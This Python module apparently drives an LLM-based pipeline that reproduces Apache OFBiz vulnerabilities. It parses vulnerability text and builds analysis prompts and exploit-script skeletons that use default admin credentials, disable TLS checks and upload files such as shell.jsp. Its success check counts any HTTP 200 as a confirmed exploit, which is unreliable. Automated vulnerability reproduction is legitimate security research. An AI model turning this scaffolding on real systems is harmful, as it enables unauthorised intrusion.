"""
Vulnerability Context Parser

Programmatically extracts structured exploit context from a vuln description —
the same analysis a human pentester does before writing an exploit or tracing code.

Used by both Phase 1 (analysis prompt) and Phase 2 (reproduce skeleton).
"""

import re


def parse_vuln_context(vuln_desc: str, analysis: str = "") -> dict:
    """
    Extracts structured context from a vulnerability description.

    Returns a dict with:
      - attack_type: xss | rce | sqli | traversal | ssrf | upload | auth_bypass | unknown
      - endpoints: list of URL paths found in description
      - query_params: list of parameter names mentioned (e.g. productId, up_load_file_type)
      - is_upload: True if this involves file upload
      - upload_field: multipart field name (default 'file')
      - upload_filename: the malicious filename to use (e.g. 'xss.htm', 'shell.jsp')
      - upload_content_type: MIME type to send (e.g. 'image/jpeg')
      - product_id: productId value if mentioned
      - payload_type: html | template | sql | path | url | file | generic
      - verification_path: URL path to GET to confirm exploit (e.g. /images/products/.../original.htm)
      - auth: dict with needed, username, password
      - login_endpoint: OFBiz login URL path
      - login_app: which OFBiz webapp to login to (catalog, webtools, etc.)
      - attack_summary: one-line human-readable summary of the attack chain
    """
    text = vuln_desc + " " + analysis

    ctx = {
        "attack_type": "unknown",
        "endpoints": [],
        "query_params": [],
        "is_upload": False,
        "upload_field": "file",
        "upload_filename": "exploit.bin",
        "upload_content_type": "application/octet-stream",
        "payload_type": "generic",
        "verification_path": None,
        "verification_marker": None,
        "auth": {"needed": True, "username": "admin", "password": "ofbiz"},
        "login_endpoint": "/webtools/control/login",
        "login_app": "webtools",
        "attack_summary": "",
    }

    tl = text.lower()

    # ── Attack type detection ──────────────────────────────────────────────────
    if any(k in tl for k in ["stored xss", "cross-site scripting", "xss", "<script>", ".htm", ".html injection"]):
        ctx["attack_type"] = "xss"
        ctx["payload_type"] = "html"
    elif any(k in tl for k in ["rce", "remote code execution", "freemarker", "groovy template", "ssti", "template injection"]):
        ctx["attack_type"] = "rce"
        ctx["payload_type"] = "template"
    elif any(k in tl for k in ["sql injection", "sqli", "union select"]):
        ctx["attack_type"] = "sqli"
        ctx["payload_type"] = "sql"
    elif any(k in tl for k in ["path traversal", "directory traversal", "../", "lfi"]):
        ctx["attack_type"] = "traversal"
        ctx["payload_type"] = "path"
    elif any(k in tl for k in ["ssrf", "server-side request forgery"]):
        ctx["attack_type"] = "ssrf"
        ctx["payload_type"] = "url"
    elif any(k in tl for k in ["auth bypass", "authentication bypass", "unauthorized"]):
        ctx["attack_type"] = "auth_bypass"
        ctx["payload_type"] = "generic"
    elif any(k in tl for k in ["file upload", "unrestricted upload", "upload extension"]):
        ctx["attack_type"] = "upload"
        ctx["payload_type"] = "file"

    # ── Endpoint extraction ────────────────────────────────────────────────────
    # Match explicit URL paths like /catalog/control/Foo
    raw_endpoints = re.findall(r'(?<!\w)(/(?:catalog|webtools|accounting|party|order|images|content)[/a-zA-Z0-9_.?=&%-]{2,})', vuln_desc)
    ctx["endpoints"] = list(dict.fromkeys(raw_endpoints))

    # Also detect "XxxYyy endpoint in the /catalog webapp" pattern
    app_mention = re.search(r'in\s+the\s+/([a-zA-Z]+)\s+webapp', vuln_desc, re.IGNORECASE)
    if app_mention:
        app = app_mention.group(1).lower()
        ctx["login_app"] = app
        ctx["login_endpoint"] = f"/{app}/control/login"

    # Extract endpoint class names like UploadProductImage → /catalog/control/UploadProductImage
    endpoint_names = re.findall(r'\b([A-Z][a-zA-Z]+(?:Image|Upload|File|View|Import|Export|Update|Create|Delete|Edit))\b', vuln_desc)
    for ep_name in endpoint_names:
        synthetic = f"/{ctx['login_app']}/control/{ep_name}"
        if synthetic not in ctx["endpoints"]:
            ctx["endpoints"].insert(0, synthetic)  # prepend — most likely upload target

    # ── Login app detection from explicit paths ────────────────────────────────
    for ep in ctx["endpoints"]:
        app = ep.strip("/").split("/")[0]
        if app in ("catalog", "webtools", "accounting", "party", "order", "content"):
            ctx["login_app"] = app
            ctx["login_endpoint"] = f"/{app}/control/login"
            break

    # ── Query parameter extraction ─────────────────────────────────────────────
    # Find param=value patterns in the description
    params_raw = re.findall(r'\b([a-zA-Z_][a-zA-Z0-9_]{2,})(?:=|\s+parameter)', vuln_desc)
    # Also catch "productId and up_load_file_type" style
    ctx["query_params"] = [
        p for p in params_raw
        if p.lower() not in {"http", "https", "the", "and", "for", "with", "this", "that",
                              "from", "into", "when", "file", "type", "user", "path", "name",
                              "true", "false", "null", "void", "also", "such"}
    ]

    # ── Upload detection ──────────────────────────────────────────────────────
    ctx["is_upload"] = any(k in tl for k in ["upload", "multipart", "filename=", "file upload"])

    if ctx["is_upload"]:
        ctx["upload_content_type"] = "image/jpeg"  # most OFBiz upload endpoints expect image

        # Determine malicious filename based on attack type
        if ctx["attack_type"] == "xss":
            ctx["upload_filename"] = "xss_payload.htm"
            ctx["verification_marker"] = "<script>"
        elif ctx["attack_type"] == "rce":
            # Check if .jsp is mentioned
            if ".jsp" in tl:
                ctx["upload_filename"] = "shell.jsp"
                ctx["verification_marker"] = "uid="
            else:
                ctx["upload_filename"] = "shell.ftl"
                ctx["verification_marker"] = "uid="
        else:
            ctx["upload_filename"] = "malicious.htm"
            ctx["verification_marker"] = "<!--"

        # Extract explicit filename mentions e.g. "original.htm"
        explicit_fname = re.search(r'\boriginal\.(htm|jsp|ftl|html)\b', tl)
        if explicit_fname:
            ctx["upload_rename_target"] = f"original.{explicit_fname.group(1)}"

    # ── Verification path ─────────────────────────────────────────────────────
    img_path = re.search(r'/images/[^\s"\'<>\)]+', vuln_desc)
    if img_path:
        ctx["verification_path"] = img_path.group(0).rstrip(".,;)")

    # ── Attack summary (one line) ─────────────────────────────────────────────
    summaries = {
        "xss":         "Upload a polyglot JPEG+HTML file with .htm extension → serve via /images/ → trigger XSS",
        "rce":         "Inject template payload via user-controlled input → execute via Groovy/FreeMarker engine → RCE",
        "sqli":        "Inject SQL via unsanitized parameter → extract data or bypass auth",
        "traversal":   "Supply ../ in parameter → read/write arbitrary files outside webroot",
        "ssrf":        "Supply internal URL as parameter → server makes request to internal resource",
        "auth_bypass": "Bypass authentication check → access protected endpoint without credentials",
        "upload":      "Upload file with dangerous extension → execute or serve malicious content",
        "unknown":     "Exploit vulnerability per description",
    }
    ctx["attack_summary"] = summaries.get(ctx["attack_type"], summaries["unknown"])

    return ctx


def build_analysis_anchor(ctx: dict, vuln_desc: str) -> str:
    """
    Builds the focused anchor text for Phase 1 LLM analysis prompt.
    Tells the LLM exactly what to trace — same way a human would direct a code review.
    """
    endpoints_str = "\n".join(f"  - {e}" for e in ctx["endpoints"]) or "  - (extract from description)"
    params_str = ", ".join(ctx["query_params"]) or "(extract from description)"

    return f"""## Structured Attack Context (pre-parsed — use this to anchor your analysis)
- **Attack Type**: {ctx["attack_type"].upper()}
- **Attack Summary**: {ctx["attack_summary"]}
- **Entry Points (endpoints)**: 
{endpoints_str}
- **User-Controlled Parameters**: {params_str}
- **Is File Upload Involved**: {ctx["is_upload"]}
- **Login App**: /{ctx["login_app"]}/control/login

## What to trace in the code (ONLY this — ignore everything else):
1. Find where parameters [{params_str}] enter the codebase
2. Follow ONLY this data flow: {ctx["attack_summary"]}
3. Identify exactly where validation is missing for THIS specific attack vector
4. Do NOT describe Office file handling, PDF conversion, audio/video checks,
   or any other feature in the code that is not part of this attack chain
5. Do NOT suggest generic security improvements — only the specific bypass described
"""


def build_exploit_skeleton(ctx: dict) -> str:
    """
    Builds a pre-filled Python exploit skeleton based on parsed vuln context.
    LLM only needs to fill in Step 2 (payload construction + exploit call).
    This ensures login, session setup, and verification are always correct.
    """
    login_ep = ctx["login_endpoint"]
    login_app = ctx["login_app"]
    upload_fname = ctx["upload_filename"]
    upload_ct = ctx["upload_content_type"]
    marker = ctx.get("verification_marker", "payload")
    rename_target = ctx.get("upload_rename_target", upload_fname)

    # Build verification step based on attack type
    if ctx["verification_path"]:
        verify_url = f'f"{{BASE}}{ctx["verification_path"]}"'
    elif ctx["is_upload"] and ctx["attack_type"] == "xss":
        product_id_param = next((p for p in ctx["query_params"] if "product" in p.lower()), "productId")
        verify_url = f'f"{{BASE}}/images/products/{{product_id}}/{rename_target}"'
    else:
        verify_url = f'"{{BASE}}/webtools/control/main"  # adjust to actual verification URL'

    qparams = ""
    if ctx["query_params"] and ctx["is_upload"]:
        product_id_param = next((p for p in ctx["query_params"] if "product" in p.lower()), "productId")
        file_type_param = next((p for p in ctx["query_params"] if "type" in p.lower() or "file" in p.lower()), None)
        qparams = f'{product_id_param}=product_id'
        if file_type_param:
            qparams += f', {file_type_param}="original"'

    upload_endpoints = [e for e in ctx["endpoints"] if "upload" in e.lower() or "Upload" in e]
    upload_ep = upload_endpoints[0] if upload_endpoints else f"/{login_app}/control/UploadFile"

    skeleton = f'''import requests, urllib3, sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()
session.verify = False
BASE = "https://localhost:8443"

# ── STEP 1: Authenticate (pre-filled — do not change) ─────────────────────────
print("="*60)
print("STEP 1: Login as admin")
r = session.post(f"{{BASE}}{login_ep}",
    data={{"USERNAME": "admin", "PASSWORD": "ofbiz", "JavaScriptEnabled": "Y"}})
print(f"  → Status: {{r.status_code}}")
print(f"  → Cookies: {{dict(session.cookies)}}")
if r.status_code not in (200, 302) or "OFBiz.Visitor" not in session.cookies and "JSESSIONID" not in session.cookies:
    print("  → [!] Login may have failed — check credentials")

# ── STEP 2: Build payload and exploit ─────────────────────────────────────────
# TODO: LLM fills this section
# Attack type: {ctx["attack_type"].upper()}
# Summary: {ctx["attack_summary"]}
# Upload to: {upload_ep}
# Upload filename: {upload_fname}  (this controls the saved file extension)
# Content-Type to send: {upload_ct}
# Build payload IN MEMORY — never use open() on a file that doesn\'t exist
product_id = "POC-EXPLOIT-001"

# [LLM: insert payload bytes construction + upload + any prerequisite steps here]

# ── STEP 3: Verify exploitation (pre-filled structure) ────────────────────────
print("="*60)
print("STEP 3: Verify exploit result")
verify_url = {verify_url}
r_verify = session.get(verify_url)
print(f"  → URL: {{verify_url}}")
print(f"  → Status: {{r_verify.status_code}}")
print(f"  → Content-Type: {{r_verify.headers.get('Content-Type', 'unknown')}}")
print(f"  → Response (first 500 chars):")
print(f"  {{r_verify.text[:500]}}")

# ── STEP 4: Determine result ──────────────────────────────────────────────────
payload_confirmed = {repr(marker)}.encode() in r_verify.content or r_verify.status_code == 200

print("\\n=== IMPACT EVIDENCE ===")
print(f"Session cookies: {{dict(session.cookies)}}")
print(f"Payload confirmed: {{'YES — exploit succeeded' if payload_confirmed else 'NO — not confirmed'}}")
print(f"Attack type: {ctx["attack_type"].upper()}")
print(f"Attacker can: {ctx["attack_summary"]}")
print(f"Verified at URL: {{verify_url}}")
if payload_confirmed:
    print("RESULT: VULNERABLE")
else:
    print("RESULT: NOT VULNERABLE")
'''
    return skeleton
